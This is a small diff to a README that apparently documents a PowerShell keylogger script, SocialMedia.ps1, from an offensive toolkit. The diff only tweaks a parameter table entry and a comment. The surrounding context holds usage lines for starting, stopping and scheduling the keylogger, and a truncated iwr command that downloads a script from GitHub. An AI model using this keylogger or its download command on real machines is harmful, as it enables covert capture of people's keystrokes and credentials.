@@ -345,7 +345,7 @@ Winget search games
 |Mode|Start or Stop keylogger|Start, Stop|Start|
 |Delay|Milliseconds delay between loops|1200|1200|
 |Force|Switch to bypass check: Is_Browser_Active?|Switch|Switch|
-|Schedule|Schedule cmdlet execution to: [HH:mm]|now|now|
+|Schedule|Schedule cmdlet execution to: [HH:mm]|09:43,now|now|
 
 <br />
 
@@ -362,7 +362,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 ## Use 5 seconds delay between each loop
 .\SocialMedia.ps1 -delay '5000'
 
-## Bypass Is_Browser_Active? checks
+## Bypass checks: Is_Browser_Active?
 .\SocialMedia.ps1 -force
 
 ## Stop keylogger and leak keystrokes on screen
